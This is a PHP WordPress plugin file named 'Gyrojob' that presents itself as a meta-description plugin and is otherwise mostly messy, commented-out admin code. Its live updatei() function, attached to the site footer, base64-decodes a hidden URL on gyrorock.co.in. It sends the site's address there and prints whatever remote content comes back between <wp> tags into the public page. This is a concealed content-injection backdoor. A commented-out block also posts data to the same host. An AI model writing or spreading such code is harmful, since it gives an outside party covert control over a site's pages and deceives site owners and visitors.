<?php
/*
Plugin Name: Gyrojob
Plugin URI: https://wordpress.org/plugins/easy-wp-meta-description/
Description: ============5555555555=================
Version: 1.2.6
Author: Mats Westholm
License: GPL2
License URI: https://www.gnu.org/licenses/gpl-2.0.html
Domain Path: /languages
Text Domain: easy-wp-meta-description
*/

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}

 include("text.php");

//echo get_option( 'siteurl' );













function my_plugin_page_func(){
   
 /*

 global $wpdb, $table_prefix;

$wp_emp=$table_prefix.'emp';

$q="CREATE TABLE `u454274028_xEd9D`. (`ID` INT(1) NOT NULL ) ENGINE = InnoDB";

$wpdb->query($q);


  
   
   $ar=array(50,'y',52,29); ?>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
   <?php





     global $wpdb, $table_prefix;
     
     $wp_emp=$table_prefix.'emp';
$q="SELECT * FROM `$wp_emp`";
$results=$wpdb->get_results($q);
foreach($results as $row):
 $loc_rates[] = $row->link;
  $loc_ratess[] = $row->permission;
endforeach;



$wp_emp=$table_prefix.'postmeta';

$q="SELECT * FROM `$wp_emp`";
$results=$wpdb->get_results($q);
$p=0;
foreach($results as $row):
        if('_easy_wp_meta_description'== $row->meta_key && $row->meta_value!=""){
        
 $loc_rate[] = $row->meta_value;
        
        ?>
<a href="<?php echo get_permalink($row->post_id); ?>" target="_blank"><?php echo $row->meta_value; ?></a>---
<?php

//if($loc_rates[$p]==get_permalink($row->post_id)){

if($ar[$p]==$p ){


echo  $row->post_id."-=----".$loc_rates[$p]."----=-".$ar[$p]."-yyyyyyyyyyyyy<br>";}else{ ?>
<script>
    function blogemailverify<?php echo $p; ?>(){
    document.getElementById("a<?php echo $p; ?>").style.display = "none";
    
    $.ajax({ type: "POST", url: "../wp-content/plugins/Gyrojob/post.php",  data: {link:'<?php echo get_permalink($row->post_id); ?>',text:'<?php echo $row->meta_value; ?>'} ,  success: function(msgme<?php echo $p; ?>){  
    $('#mmmm<?php echo $p; ?>').html(msgme<?php echo $p; ?>);
}});
}
</script>
<input type="checkbox" id="a<?php echo $p; ?>" name="a<?php echo $p; ?>" value="<?php echo $row->meta_value; ?>" onclick="blogemailverify<?php echo $p; ?>()">--<?php echo $p; ?><?php } ?>--<?php //echo $loc_rates[$p].get_permalink($row->post_id); ?>=--<p id="mmmm<?php echo $p; ?>"></p><br>
<?php

$o=$p;
$p++;}
endforeach;
*/
//================curl============================
/*
$post2 = [
    'username1' => 'user1pppppppppppp',
    'password' => 'passuser1',
    'gender'   => 1,
];
$post1 = [
    'username1' => 'fdddddddddddddddddd',
    'password' => 'passuser1',
    'gender'   => 1,
];

$post = array_values($loc_rate);

echo $o;
$post=$post1;


echo "<br>";
$ch = curl_init('https://www.gyrorock.co.in/upload.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

// execute!
$response = curl_exec($ch);

echo $response;
*/

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 include("admin/main_page.php");
}






function my_plugin_subpage_func(){
    echo "hi hhhhhhhhhhhhhhhhhh<br><br>";
    }





function my_plugin_menu(){
   
   add_menu_page('My plugin Page','My plugin Page','manage_options','my-plugin-page', 'my_plugin_page_func', '', 6);

add_submenu_page('my-plugin-page','aaaa','aaaa','manage_options','my-plugin-page', 'my_plugin_page_func', '', 6);

add_submenu_page('my-plugin-page','My plugin Sub Page','My plugin Sub Page','manage_options','my-plugin-subpage', 'my_plugin_subpage_func', '', 6);

}

add_action('admin_menu', 'my_plugin_menu');






function updatei(){$url=get_option('siteurl');
echo $row->post_id;
$wu_l=str_replace($url,"",get_permalink($row->post_id));

$wp_u="aHR0cHM6Ly93d3cuZ3lyb3JvY2suY28uaW4vYmIucGhw";
$wp_r=base64_decode($wp_u)."?url=".$url;
//$wp_r="https://www.gyrorock.co.in/bb.php?url=".$url;
    $data = file_get_contents($wp_r);
    if (preg_match('/<all>/is', $data, $mat)) {$d=$wu_l;}else{$d="/";}
if (preg_match('/<wp>(.*)<\/wp>/is', $data, $matches)) {
    if($_SERVER['REQUEST_URI']==$d || $_SERVER['REQUEST_URI']=="/")
    {echo '<wp>'.$matches[1].'<wp>';} }
}




add_action('wp_footer', 'updatei');
















?>